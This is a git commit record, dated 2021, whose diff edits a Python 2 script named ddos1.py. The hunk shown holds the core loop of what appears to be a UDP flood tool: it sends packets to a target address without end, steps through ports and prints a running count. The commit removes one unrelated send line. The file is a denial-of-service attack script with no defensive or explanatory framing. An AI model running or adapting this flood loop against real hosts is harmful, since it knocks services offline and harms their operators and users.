fe75fd5cf4d1a7425f5e5d0c3389db32e9c54042
zhicco234 <89173970+zhicco234@users.noreply.github.com>
2021-08-23 17:39:02 +0700

    Update ddos1.py

--- ddos1.py
+++ ddos1.py
@@ -45,7 +45,6 @@ time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     s.sendto(p.respuesta(target), addr)
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
